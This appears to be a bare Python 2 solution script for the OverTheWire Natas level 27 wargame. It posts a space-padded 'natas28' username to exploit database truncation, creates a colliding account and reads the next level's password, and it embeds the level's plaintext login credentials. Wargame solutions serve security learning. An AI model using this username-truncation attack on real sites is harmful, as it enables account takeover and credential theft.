import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas27.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

data = dict(username='natas28' + ' '*100 + 'meow', password='meowmeowmeow')
r = requests.post(url, auth=auth, data=data)

data= dict(username='natas28', password='meowmeowmeow')
r = requests.post(url, auth=auth, data=data)
print r.text